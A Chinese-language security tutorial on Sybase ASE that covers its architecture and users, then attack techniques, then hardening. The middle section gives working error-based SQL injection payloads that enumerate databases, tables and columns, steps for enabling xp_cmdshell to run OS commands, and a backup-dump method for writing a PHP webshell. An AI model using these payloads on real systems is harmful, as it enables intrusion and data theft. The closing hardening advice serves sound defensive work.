@@ -1,0 +1,69 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Sybase数据库安全</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">clzzy</a> <span class="bull">·</span> <time title="2015/08/17 10:18" ui-time="" datetime="2015/08/17 10:18" class="published ng-binding ng-isolate-scope">2015/08/17 10:18</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 Sybase数据库介绍</h1><hr><h3>简介</h3><p>Sybase的全称又叫： <code>SAP Sybase Adaptive Server Enterprise</code>（简称ASE或Sybase ASE），继承于MSSQL的原始代码，和MSSQL血缘很近。Sybase是一种关系型数据库系统，是一种典型的UNIX或WindowsNT平台上客户机/服务器环境下的大型数据库系统。它以PowerBuilder为开发工具，以<code>SAP Sybase SQL Anywhere</code>为客户端。目前新版是ASE 15.7.x，命名从12.5.5直接到15.0.0（跳过中间的13、14），本次测试的是12.5.2，其中12.5是12大版本中最稳定的版本。</p><p><img alt="enter image description here" img-src="d6805b4da23cf14efa6d076ec768f68ad2ffaeec.jpg"></p><p>创建数据库的时候要注意存放设备：</p><p><img alt="enter image description here" img-src="15fb88bc89ff0840d0333d304537e8a98fa39e50.jpg"></p><h3>服务及端口</h3><p><img alt="enter image description here" img-src="6cbf612aab8967854c6c91dcb3403c0d3b8fe7a8.jpg"></p><p>开放端口：</p><p>备份服务：5001、监控服务：5002、数据库主服务：5000、存储过程服务：5004</p><h3>默认数据库</h3><p><img alt="enter image description here" img-src="2cd0b9f454a57db00159a954c4b4cbfb2c0735d6.jpg"></p><p><strong>Master</strong>：系统的核心数据库，控制服务器的操作以及存储有关所有用户数据库和相关的存储设备的信息，包括用户的用户名和密码；</p><p><strong>Model</strong>：模板数据库，当创建用户数据库时，系统根据model数据库制作副本，并将数据库的大小扩展到用户指定的大小。</p><p><strong>Systemprocs</strong>：保存系统的存储过程。</p><p><strong>Sybsystemdb</strong>：关于分布式事务管理功能。</p><p><strong>Tempdb</strong>：包含临时表，放置临时数据。</p><h3>注册用户和数据库用户</h3><p>当SQL SERVER创建注册用户后，该用户就能合法进SQL SERVER，该注册用户信息会放在master数据库中的 syslogins表中。但只有注册用户成为某一数据库用户，并且对该用户赋予某些权限时，该注册用户才能在限制条件下使用数据库中的表。</p><p>创建注册用户：</p><pre><code>sp_addlogin loginame, passwd     (删除即为drop)
+</code></pre><p>创建数据库用户：</p><pre><code>[dbname..] sp_adduser loginame    （此处的loginame 必须是注册用户，否则报错）
+</code></pre><p>分配权限：</p><pre><code>grant all | select,insert,delete,update
+on table_name | view_name | stored_procedure_name
+to username
+</code></pre><p>或</p><pre><code>grant all | create database,create
+default,create procedure,create rule,create table,create view,set proxy,set session authorization
+to username
+</code></pre><h3>数据库用户分类</h3><p>sa用户、数据库属主、数据库对象属主和数据库普通用户</p><p>1）、sa用户:为系统用户，拥有全部的权限。</p><p>2）、数据库属主用户：数据库属主（dbo）用户可对本数据库中所有对象（如表、视图、存储过程等）进行操作。</p><p>3）、数据库对象属主：在实际管理中， ，一般为数据库属主。</p><p>4）、数据库普通用户：类似于public，数据库普通用户必须在数据库属主对本数据库中某些对象（如表、视图、进程等）赋予某些权限时，才可对本数据库中某些对象进行允许的操作。</p><h3>别名（aliases）与组（group）</h3><p>1）、别名：所谓别名（aliases)即将SQL SERVER中的注册用户以同一个数据库用户的身份来访问数据库，并具有与该用户相同的权限。</p><p>2）、组（group）为数据库用户的集合，即通过对组(group)的权限的控制达到对该组中数据库用户的控制，但也可对该组中数据库某些用户进行格外的权限控制。</p><p><img alt="enter image description here" img-src="1bf88f2834d8596cc2d6d67f4adf9daed4642399.jpg"></p><h3>角色</h3><p>一般在管理分工较细的数据库系统中，sa用户往往被分为三种角色：系统管理员角色(SA role)、系统安全员角色(SSO role)、操作员角色（OPER role）。</p><p><img alt="enter image description here" img-src="a4b1a8a23d34fd79af7b79c14dc89d57bfe0b63e.jpg"></p><h3>连接及管理工具</h3><p><strong>1）、isql</strong></p><p>类似于mysql数据库的的mysql.exe。可连接本地及网络数据库。 使用isql –U sa –P “”连接:</p><p><img alt="enter image description here" img-src="6b9155e6f2ea2fd117ac0060d8eb1df52e3bd423.jpg"></p><p>所有参数要区分大小写：</p><p>-?显示 isql 开关的语法摘要。</p><p>-L列出在本地配置的服务器和在网络上广播的服务器的名称。</p><p>-U login_id用户登录 ID。登录 ID 区分大小写。</p><p>-P password 是用户指定的密码。如果未使用-P 选项，isql 将提示输入密码。如果在命令提示的末尾使用 -P 选项而不带密码，isql 使用默认密码NULL)。密码区分大小写。</p><p>-S server_name 指定要连接到的 SQL Server 默认实例。如果未指定服务器，isql 将连接 到本地计算机上的 SQL Server 默认实例。如果要在网络上从远程计算机执行 isql，则需要此选项。</p><p>-H hostname 是使用的客户端的主机名称。</p><p>-d use database name，用于指定使用数据库名</p><p><strong>2）、官方Sybase SQL Advantage</strong></p><p>缺点：a、随数据库完整安装包一起发布，使用时有版本上的要求。</p><p>b、只支持SQL语句，个人觉得就是isql的图形化版，有所不便。</p><p><img alt="enter image description here" img-src="2b62a50698f94496a7f78764efff892aa870ccef.jpg"></p><p><img alt="enter image description here" img-src="ca9e386baba0239c0eee807380e3cfd2088122a4.jpg"></p><p>（Sql.ini设定及功能：http://blog.csdn.net/potato015/article/details/2450989 ）</p><p><strong>3）、官方Sybase Central</strong></p><p>缺点：a、随数据库完整安装包一起发布，使用时有版本上的要求。</p><p>b、功能不是很强大</p><p><img alt="enter image description here" img-src="e58ba4701b015bc6740f39524ce40c2462ac7c98.jpg"></p><p><strong>4）、DBArtisan</strong></p><p><img alt="enter image description here" img-src="7dfe0ec560bf8a9fe1bf9e16665e9b3edb5596d3.jpg"></p><h1>0x01 Sybase安全</h1><h3>执行系统命令</h3><p>默认xp&#95;cmdshell是不开启的。未开启xp&#95;cmdshell时：</p><p><img alt="enter image description here" img-src="2d9275e004434024b733bf61414b0029d42c7d4e.jpg"></p><p>开启xp&#95;cmdshell : sp&#95;configure 'xp_cmdshell context',0</p><p><img alt="enter image description here" img-src="281ef120982d69c2623b399152693fb12873289c.jpg"></p><p>开启xp_cmdshell后执行命令:</p><p><img alt="enter image description here" img-src="3b2a63a9655ede8d8340b8b1aa6a5ee29d1e37f7.jpg"></p><p>权限不够时执行xp_cmdshell:</p><p><img alt="enter image description here" img-src="e940e81dbd508e807b1484272e82e1f8b81d6327.jpg"></p><p><strong>细节：</strong></p><p>1、执行 sp&#95;configure 'xp&#95;cmdshell',0 允许所有含sa&#95;role角色的login用户执行xp&#95;cmdshell命令，此功能默认关闭</p><p>2、默认 sp&#95;configure 'xp&#95;cmdshell',1 经测试需要在windows下具有相同longin用户名称和密码，并且该用户隶属administrators权限组，还有一点不能忽略：取消选择“用户下次登录时需更改密码”！</p><p>3、MSSQL由于和windows集成，可以直接使用系统账户登录到数据库。而Sybase则需要按照上面第二步做配置才能达到和MSSQL类似的效果。</p><h3>注释符与联合查询</h3><p>支持union，可以用/<strong>/、--来注释，可以用/</strong>/来替换空格，也可以用+代替空格，也支持count(<em>)，不过通配符</em>不能出现在子查询中。</p><p><img alt="enter image description here" img-src="ce527f174ed9769cea6ffed7eb351b32e14bd68c.jpg"></p><p>12.5.2及以前的版本不支持TOP关键字，形如select top N from注入语句将报错</p><p><img alt="enter image description here" img-src="19f30adcd4da5b9eebb7073d48e6b6e68ac0633e.jpg"></p><p>当然，不能用top，肯定会有替代方案，那就是set rowcount N</p><p><img alt="enter image description here" img-src="411c12fce6027a8f1cefe4228e5c6f10daf04340.jpg"></p><p><img alt="enter image description here" img-src="179656b36b004318eb64687f5a57928242008e87.jpg"></p><p>但是set rowcount N貌似不支持子查询和条件句：</p><p><img alt="enter image description here" img-src="492456e99ce4f6a0cbae1d0e3a6510822fa9b7bc.jpg"></p><h3>多句执行</h3><p>与mssql不同的地方是：多条语句直接以空格分隔，而不是分号。</p><p><img alt="enter image description here" img-src="cbc8d03b8e145a4870aa108075843b61d819f958.jpg"></p><p><img alt="enter image description here" img-src="5baf1ff69fa1d4600331c5e2dd1ad85f3f7ad112.jpg"></p><h3>对编码的支持</h3><p>与MSSQL相同：</p><p><img alt="enter image description here" img-src="13f9fe5b43141c4fbb9d328b89711d16f91389bf.jpg"></p><h3>SQL注入特性</h3><p>以Php为脚本：</p><p><img alt="enter image description here" img-src="648e6bf8a80774147e2260fa1aae76e7dfeedfe8.jpg"></p><p>以Java为脚本：</p><p><img alt="enter image description here" img-src="bf71025e9bf293a9ddd67ad80d08ebc28a54b0dc.jpg"></p><p>判断是否是Sybase数据库：</p><pre><code>id=1 and exists(select * from master.dbo.ijdbc_function_escapes)
+</code></pre><p><img alt="enter image description here" img-src="1850f39434483649538dad6014f0b680af36c94a.jpg"></p><p><img alt="enter image description here" img-src="cf55a2aaa016787b2891e5c7ce171f35d8874c29.jpg"></p><p>以报错方式注入时要注意，sybase是不支持不同类型数据直接相比较的（与MSSQL不同）：</p><pre><code>id=1 and 1=user
+id=1 and 1=convert(integer,user)
+
+![enter image description here][28]
+
+id=1 and 1=convert(integer,(select+@@version))
+
+![enter image description here][29]
+
+id=-1 union select 1,"",(select @@version)
+</code></pre><p><img alt="enter image description here" img-src="0e318b4a16034f3191b52ae0a5fa52afaef3c457.jpg"></p><p>列库（复杂版本）：</p><pre><code>id=1 and 1=convert(integer,(SELECT MIN(ISNULL(CONVERT(NVARCHAR(4000),gJyQ.name),CHAR(32))) FROM (SELECT name FROM master..sysdatabases) AS gJyQ WHERE CONVERT(NVARCHAR(4000),gJyQ.name)&gt;‘ ’)) 
+</code></pre><p>列出第一个库master</p><pre><code>id=1 and 1=convert(integer,(SELECT MIN(ISNULL(CONVERT(NVARCHAR(4000),gJyQ.name),CHAR(32))) FROM (SELECT name FROM master..sysdatabases) AS gJyQ WHERE CONVERT(NVARCHAR(4000),gJyQ.name)&gt;’master‘))  
+</code></pre><p>列出除master外的第一个库</p><p><img alt="enter image description here" img-src="5c291124b89c7c7a33274ea0731bb53448ba4893.jpg"></p><p>列库（简单版本）：</p><pre><code>id=1 and 1=convert(integer,(SELECT name FROM master..sysdatabases where dbid=1))   不断递增dbid的值
+</code></pre><p><img alt="enter image description here" img-src="152169603d5c4107178500b49a6a3376f8621601.jpg"></p><p>dbid是连续的数字，猜解起来很容易</p><p><img alt="enter image description here" img-src="453213f72fc9d49d8f0908b17bbbbbbc41597087.jpg"></p><p>PS：虽然Sybase不能用TOP、for xml path，但是支持having、where not in等语法，变化方式依然有多种</p><p>与MSSQL不同的一点：</p><p>MSSQL是xtype Sybase是type</p><p><img alt="enter image description here" img-src="8bf35011b5cebffad339eb5744bc6e49c11ecbd1.jpg"></p><p>列表(只能用复杂版)：</p><pre><code>id=1 and 1=convert(integer,(select MIN(ISNULL(CONVERT(NVARCHAR(4000),aaaa.name),CHAR(32))) from (select name from test.dbo.sysobjects where type=‘U’) AS aaaa where CONVERT(NVARCHAR(4000),aaaa.name)&gt;‘ ’))
+</code></pre><p>列出第一个表cmd</p><pre><code>id=1 and 1=convert(integer,(select MIN(ISNULL(CONVERT(NVARCHAR(4000),aaaa.name),CHAR(32))) from (select name from test.dbo.sysobjects where type=‘U’) AS aaaa where CONVERT(NVARCHAR(4000),aaaa.name)&gt;‘cmd’))
+</code></pre><p>列出除cmd外的第一个表cmd0</p><p><img alt="enter image description here" img-src="60a4cf765fab69027f76d4af0b299acb90127bb5.jpg"></p><p>列字段：</p><pre><code>select name from test..syscolumns where id=object_id(‘users’) and colid=1  递增colid
+</code></pre><p>即：</p><pre><code>id=1 and 1=convert(integer,(select name from test..syscolumns where id=object_id('users') and colid=1))
+</code></pre><p><img alt="enter image description here" img-src="e480ab18ba57089012e2db592dec4a16cb0be12c.jpg"></p><p>工具注入：</p><p><img alt="enter image description here" img-src="22a3d31bf3d4b486782c67db87eaa529ab5189e8.jpg"></p><p>穿山甲猜不出库名，抓包发现使用了TOP关键字，看来穿山甲只支持12.5.3以后的sybase</p><p><img alt="enter image description here" img-src="57a9d8604621097de5c762867824b73fa1052087.jpg"></p><h3>备份写文件（webshell）</h3><p>前提条件：</p><p>1、备份服务打开</p><p>2、备份服务允许远程访问</p><p>3、有数据库权限（宿主权限）+磁盘写权限</p><p>步骤：</p><pre><code>1、create table cmd(a image)—
+
+2、insert into cmd(a) values ('&lt;?php phpinfo();?&gt;')—
+
+3、dump database test to ‘C:\wamp\www\1.php’ 【全备份】
+（对应MSSQL为：backup database 库名 to disk= 'C:\wamp\www\1.php ' WITH DIFFERENTIAL,FORMAT;--）
+   dump TRANSACTION test to ‘C:\wamp\www\1.php’ 【LOG备份】
+（对应MSSQL为：backup log 库名 to disk='d:\www\xxx\test.asp'--）
+
+注：使用dump TRANSACTION时要求数据文件和日志文件不能存放在同一设备中。
+
+4、drop table cmd--
+</code></pre><p><img alt="enter image description here" img-src="2a980476176fa2b17a629bf07cd18c9be98657c0.jpg"></p><h3>加固与防范</h3><h4>口令</h4><pre><code>sp_password  “原密码”, “新密码”,用户名
+</code></pre><p>例如将sa用户的密码由空改为123456： sp_password NULL,”123456”,sa</p><pre><code>sp_configure “minimum password length”,8    ---密码最短长度
+
+sp_configure “check password for digit”,1   ---至少包含一个数字
+
+sp_configure “systemwide password expiration”,90   ---口令有效时长
+
+sp_configure “maximum failed logins”,5   ---设置口令错误锁定阀值
+</code></pre><p>删除扩展存储过程xp_cmdshell， 并删 除 sybsyesp.dll</p><pre><code>exec  sp_dropextendedproc  xp_cmdshell
+</code></pre><p>关闭sa账户的使用：</p><pre><code>sp_locklogin sa,"lock“
+</code></pre><p>关闭远程访问：</p><pre><code>exec sp_configure “allow remote access” ,0
+</code></pre><p>关闭后，很多服务将无法使用，比如备份</p><h4>登陆IP白名单</h4><p>系统没有和登陆相关的限制设置，只能通过创建登录触发器来实现登陆IP白名单</p><pre><code>create procedure login_trg 
+as  
+   <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="3e5a5b5d525f4c5bfc9e7e574efc9e485f4c5d565f4c">[email&#160;protected]</a>(18),@login_name varchar(20) 
+begin  
+   select 
+   @ip=t.ipaddr,@login_name=suser_name() 
+   from master.dbo.sysprocesses t where t.spid=@@spid  
+   <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="94fdf25634d4fde4">[email&#160;protected]</a>&lt;&gt;'192.168.0.102'
+      begin  
+         raiserror 30000 'IP address %1! ,with user %2! login failed!',@ip,@login_name 
+         select syb_quit() 
+      end 
+   else  
+       print 'Welcome!' 
+end  
+</code></pre><p>创建登录触发器后，执行如下命令：</p><pre><code>isql&gt;grant execute on login_trg to loginname  
+isql&gt;sp_modifylogin loginname, "login script",login_trg
+</code></pre><p></p><h4>日志</h4><pre><code>isql&gt;exec sp_configure "log audit logon failure",1 --记录登录失败信息
+isql&gt;exec sp_configure "log audit logon success",1 --记录登录成功信息
+</code></pre><p>http://drops.wooyun.org/wp-content/uploads/2015/08/</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/1620" rel="bookmark" id="re1">MSSQL注射知识库 v 1.0</a></li><li><a href="http://drops.wooyun.org/tips/7840" rel="bookmark" id="re2">SQL注入速查表（上）</a></li><li><a href="http://drops.wooyun.org/tips/1670" rel="bookmark" id="re3">SQL SERVER 2008安全配置</a></li><li><a href="http://drops.wooyun.org/tips/2078" rel="bookmark" id="re4">利用insert，update和delete注入获取数据</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">枯荣</span> <span class="reply-time">2015-08-18 14:32:57</span></div><p></p><p>THX 学习了</p><p></p></div></div></div></div></div></main>
